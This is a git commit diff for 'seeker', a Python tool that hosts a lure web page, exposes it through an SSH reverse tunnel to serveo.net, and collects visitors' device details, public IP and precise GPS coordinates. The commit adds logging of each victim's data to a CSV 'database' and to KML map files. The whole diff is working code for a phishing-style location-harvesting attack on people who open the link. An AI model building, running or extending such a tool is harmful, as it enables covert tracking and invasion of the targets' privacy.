95b7d7449394447f378d6b2a35ec704f9fec9848
thewhiteh4t <lohityapushkar@gmail.com>
2019-08-24 12:01:04 +0530

    v1.1.4 - Serveo status check, csv and kml generation

--- seeker.py
+++ seeker.py
@@ -2,6 +2,7 @@
 # -*- coding: utf-8 -*-
 
 import os
+import csv
 import sys
 import time
 import json
@@ -14,50 +15,93 @@ G = '\033[32m' # green
 C = '\033[36m' # cyan
 W = '\033[0m'  # white
 
-if sys.version_info[0] < 3:
-	print(R + '\n[-]' + C + ' Execute script with python3...\n' + W)
-	exit()
-
 parser = argparse.ArgumentParser()
 parser.add_argument('-s', '--subdomain', help='Provide Subdomain for Serveo URL ( Optional )')
+parser.add_argument('-k', '--kml', help='Provide KML Filename ( Optional )')
 args = parser.parse_args()
 subdom = args.subdomain
+kml_fname = args.kml
 
 result = 'template/nearyou/php/result.txt'
 info = 'template/nearyou/php/info.txt'
 site = 'nearyou'
-version = '1.1.3'
+row = []
+version = '1.1.4'
 
 def banner():
 	os.system('clear')
 	print (G +
-	r'''                        __
+	r'''
+                        __
   ______  ____   ____  |  | __  ____ _______
  /  ___/_/ __ \_/ __ \ |  |/ /_/ __ \\_  __ \
  \___ \ \  ___/\  ___/ |    < \  ___/ |  | \/
 /____  > \___  >\___  >|__|_ \ \___  >|__|
 	 \/      \/     \/      \/     \/        ''' + W)
-	print ('\n' + G + '[>]' + C + ' Created By : ' + W + 'thewhiteh4t')
-	print (G + '[>]' + C + ' Version    : ' + W + version + '\n')
+	print('\n' + G + '[>]' + C + ' Created By : ' + W + 'thewhiteh4t')
+	print(G + '[>]' + C + ' Version    : ' + W + version + '\n')
+
+def ver_check():
+	print(G + '[+]' + C + ' Checking for Updates.....', end='')
+	ver_url = 'https://raw.githubusercontent.com/thewhiteh4t/seeker/master/version.txt'
+	ver_rqst = requests.get(ver_url)
+	ver_sc = ver_rqst.status_code
+	if ver_sc == 200:
+		github_ver = ver_rqst.text
+		github_ver = github_ver.strip()
+
+		if version == github_ver:
+			print(C + '[' + G + ' Up-To-Date ' + C +']' + '\n')
+		else:
+			print(C + '[' + G + ' Available : {} '.format(github_ver) + C + ']' + '\n')
+	else:
+		print(C + '[' + R + ' Status : {} '.format(ver_sc) + C + ']' + '\n')
 
 def serveo():
 	global site, subdom
 	flag = False
-	print (G + '[+]' + C + ' Starting PHP Server...' + W)
-	with open ('php.log', 'w') as phplog:
-		subp.Popen(['php', '-S', '127.0.0.1:8080', '-t', 'template/'], stderr=phplog, stdout=phplog)
 
-	print ('\n' + G + '[+]' + C + ' Getting Serveo URL...' + W + '\n')
+	print(G + '[+]' + C + ' Checking Serveo Status...', end='')
+
+	try:
+		time.sleep(1)
+		rqst = requests.get('https://serveo.net', timeout=5)
+		sc = rqst.status_code
+		if sc == 200:
+			print(C + '[' + G + ' UP ' + C + ']' + W + '\n')
+		else:
+			print(C + '[' + R + 'Status : {}'.format(sc) + C + ']' + W + '\n')
+	except requests.ConnectionError:
+		print(C + '[' + R + ' DOWN ' + C + ']' + W + '\n')
+		exit()
+			
+
+	print(G + '[+]' + C + ' Starting PHP Server......' + W, end='')
+	with open('php.log', 'w') as phplog:
+		subp.Popen(['php', '-S', '127.0.0.1:8080', '-t', 'template/'], stdout=phplog, stderr=phplog)
+		time.sleep(2)
+	try:
+		php_rqst = requests.get('http://127.0.0.1:8080/nearyou/index.html')
+		php_sc = php_rqst.status_code
+		if php_sc == 200:
+			print(C + '[' + G + ' Success ' + C + ']' + W + '\n')
+		else:
+			print(C + '[' + R + 'Status : {}'.format(php_sc) + C + ']' + W + '\n')
+	except requests.ConnectionError:
+		print(C + '[' + R + ' Failed ' + C + ']' + W + '\n')
+		Quit()
+
+	print(G + '[+]' + C + ' Getting Serveo URL...' + W + '\n')
 	if subdom is None:
-		with open ('serveo.txt', 'w') as tmpfile:
-			proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '80:localhost:8080', 'serveo.net'], stdout = tmpfile, stderr = tmpfile, stdin = subp.PIPE)
+		with open('serveo.txt', 'w') as tmpfile:
+			proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '80:localhost:8080', 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
 	else:
-		with open ('serveo.txt', 'w') as tmpfile:
-			proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '{}.serveo.net:80:localhost:8080'.format(subdom), 'serveo.net'], stdout = tmpfile, stderr = tmpfile, stdin = subp.PIPE)
+		with open('serveo.txt', 'w') as tmpfile:
+			proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '{}.serveo.net:80:localhost:8080'.format(subdom), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
 	while True:
 		
 		time.sleep(2)
-		with open ('serveo.txt', 'r') as tmpfile:
+		with open('serveo.txt', 'r') as tmpfile:
 			try:
 				stdout = tmpfile.readlines()
 				if flag == False:
@@ -66,14 +110,14 @@ def serveo():
 							elem = elem.split(' ')
 							url = elem[4].strip()
 							url = url + '/{}/'.format(site)
-							print (G + '[+]' + C + ' URL : ' + W + url)
+							print(G + '[+]' + C + ' URL : ' + W + url)
 							flag = True
 						else:
 							pass
 				elif flag == True:
 					break
 			except Exception as e:
-				print (e)
+				print(e)
 				pass
 
 def wait():
@@ -88,30 +132,68 @@ def wait():
 			main()
 
 def main():
-	global result
+	global result, row, var_lat, var_lon
 	try:
+		row = []
 		with open (info, 'r') as file2:
 			file2 = file2.read()
 			json3 = json.loads(file2)
 			for value in json3['dev']:
-				print(G + '[+]' + C + ' Device Information : ' + W + '\n')
-				print(G + '[+]' + C + ' OS         : ' + W + value['os'])
-				print(G + '[+]' + C + ' Platform   : ' + W + value['platform'])
+
+				var_os = value['os']
+				var_platform = value['platform']
 				try:
-					print(G + '[+]' + C + ' CPU Cores  : ' + W + value['cores'])
+					var_cores = value['cores']
 				except TypeError:
-					pass
-				print(G + '[+]' + C + ' RAM        : ' + W + value['ram'])
-				print(G + '[+]' + C + ' GPU Vendor : ' + W + value['vendor'])
-				print(G + '[+]' + C + ' GPU        : ' + W + value['render'])
-				print(G + '[+]' + C + ' Resolution : ' + W + value['wd'] + 'x' + value['ht'])
-				print(G + '[+]' + C + ' Browser    : ' + W + value['browser'])
-				print(G + '[+]' + C + ' Public IP  : ' + W + value['ip'])
+					var_cores = 'Not Available'
+				var_ram = value['ram']
+				var_vendor = value['vendor']
+				var_render = value['render']
+				var_res = value['wd'] + 'x' + value['ht']
+				var_browser = value['browser']
+				var_ip = value['ip']
+
+				row.append(var_os)
+				row.append(var_platform) 
+				row.append(var_cores) 
+				row.append(var_ram) 
+				row.append(var_vendor)
+				row.append(var_render)
+				row.append(var_res)
+				row.append(var_browser)
+				row.append(var_ip)
+
+				print(G + '[+]' + C + ' Device Information : ' + W + '\n')
+				print(G + '[+]' + C + ' OS         : ' + W + var_os)
+				print(G + '[+]' + C + ' Platform   : ' + W + var_platform)
+				print(G + '[+]' + C + ' CPU Cores  : ' + W + var_cores)
+				print(G + '[+]' + C + ' RAM        : ' + W + var_ram)
+				print(G + '[+]' + C + ' GPU Vendor : ' + W + var_vendor)
+				print(G + '[+]' + C + ' GPU        : ' + W + var_render)
+				print(G + '[+]' + C + ' Resolution : ' + W + var_res)
+				print(G + '[+]' + C + ' Browser    : ' + W + var_browser)
+				print(G + '[+]' + C + ' Public IP  : ' + W + var_ip)
+
 				rqst = requests.get('http://free.ipwhois.io/json/{}'.format(value['ip']))
 				sc = rqst.status_code
+
 				if sc == 200:
 					data = rqst.text
 					data = json.loads(data)
+					var_continent = data['continent']
+					var_country = data['country']
+					var_region = data['region']
+					var_city = data['city']
+					var_org = data['org']
+					var_isp = data['isp']
+
+					row.append(var_continent)
+					row.append(var_country)
+					row.append(var_region)
+					row.append(var_city)
+					row.append(var_org)
+					row.append(var_isp)
+
 					print(G + '[+]' + C + ' Continent  : ' + W + data['continent'])
 					print(G + '[+]' + C + ' Country    : ' + W + data['country'])
 					print(G + '[+]' + C + ' Region     : ' + W + data['region'])
@@ -120,47 +202,79 @@ def main():
 					print(G + '[+]' + C + ' ISP        : ' + W + data['isp'])
 	except ValueError:
 		pass
-
+	
 	try:
 		with open (result, 'r') as file:
 			file = file.read()
 			json2 = json.loads(file)
 			for value in json2['info']:
-				lat = value['lat']
-				lon = value['lon']
-				acc = value['acc']
-				alt = value['alt']
-				dir = value['dir']
-				spd = value['spd']
+				var_lat = value['lat'] + ' deg'
+				var_lon = value['lon'] + ' deg'
+				var_acc = value['acc'] + ' m'
+
+				var_alt = value['alt']
+				if var_alt == '':
+					var_alt = 'Not Available'
+				else:
+					var_alt == value['alt'] + ' m'
+				
+				var_dir = value['dir']
+				if var_dir == '':
+					var_dir = 'Not Available'
+				else:
+					var_dir = value['dir'] + ' deg'
+				
+				var_spd = value['spd']
+				if var_spd == '':
+					var_spd = 'Not Available'
+				else:
+					var_spd = value['spd'] + ' m/s'
+
+				row.append(var_lat)
+				row.append(var_lon)
+				row.append(var_acc)
+				row.append(var_alt)
+				row.append(var_dir)
+				row.append(var_spd)
 
 				print ('\n' + G + '[+]' + C + ' Location Information : ' + W + '\n')
-				print (G + '[+]' + C + ' Latitude  : ' + W + lat + C + ' deg')
-				print (G + '[+]' + C + ' Longitude : ' + W + lon + C + ' deg')
-				print (G + '[+]' + C + ' Accuracy  : ' + W + acc + C + ' m')
-
-				if alt == '':
-					print (R + '[-]' + C + ' Altitude  : ' + W + 'Not Available')
-				else:
-					print (G + '[+]' + C + ' Altitude  : ' + W + alt + C + ' m')
-
-				if dir == '':
-					print (R + '[-]' + C + ' Direction : ' + W + 'Not Available')
-				else:
-					print (G + '[+]' + C + ' Direction : ' + W + dir + C + ' deg')
-
-				if spd == '':
-					print (R + '[-]' + C + ' Speed     : ' + W + 'Not Available')
-				else:
-					print (G + '[+]' + C + ' Speed     : ' + W + spd + C + ' m/s')
+				print (G + '[+]' + C + ' Latitude  : ' + W + var_lat)
+				print (G + '[+]' + C + ' Longitude : ' + W + var_lon)
+				print (G + '[+]' + C + ' Accuracy  : ' + W + var_acc)
+				print (G + '[+]' + C + ' Altitude  : ' + W + var_alt)
+				print (G + '[+]' + C + ' Direction : ' + W + var_dir)
+				print (G + '[+]' + C + ' Speed     : ' + W + var_spd)
 	except ValueError:
 		error = file
 		print ('\n' + R + '[-] ' + W + error)
 		repeat()
 
-	def maps():
-		print ('\n' + G + '[+]' + C + ' Google Maps : ' + W + 'https://www.google.com/maps/place/' + lat + '+' + lon)
-		repeat()
-	maps()
+	print ('\n' + G + '[+]' + C + ' Google Maps.................: ' + W + 'https://www.google.com/maps/place/' + var_lat.strip(' deg') + '+' + var_lon.strip(' deg'))
+	
+	if kml_fname is not None:
+		kmlout(var_lat, var_lon)
+
+	csvout()
+	repeat()
+
+def kmlout(var_lat, var_lon):
+	with open('sample.kml', 'r') as kml_sample:
+		kml_sample_data = kml_sample.read()
+
+	kml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' deg'))
+	kml_sample_data = kml_sample_data.replace('LATITUDE', var_lat.strip(' deg'))
+
+	with open('{}.kml'.format(kml_fname), 'w') as kml_gen:
+		kml_gen.write(kml_sample_data)
+
+	print(G + '[+]' + C + ' KML File Generated..........: ' + W + os.getcwd() + '/{}.kml'.format(kml_fname))
+
+def csvout():
+	global row
+	with open('results.csv', 'a') as csvfile:
+		writer = csv.writer(csvfile)
+		writer.writerow(row)
+	print(G + '[+]' + C + ' New Entry Added in Database.: ' + W + os.getcwd() + '/results.csv')
 
 def clear():
 	global result
@@ -172,7 +286,7 @@ def repeat():
 	wait()
 	main()
 
-def quit():
+def Quit():
 	global result
 	with open (result, 'w+'): pass
 	os.system('pkill php')
@@ -180,10 +294,11 @@ def quit():
 
 try:
 	banner()
+	ver_check()
 	serveo()
 	wait()
 	main()
 
 except KeyboardInterrupt:
 	print ('\n' + R + '[!]' + C + ' Keyboard Interrupt.' + W)
-	quit()
+	Quit()
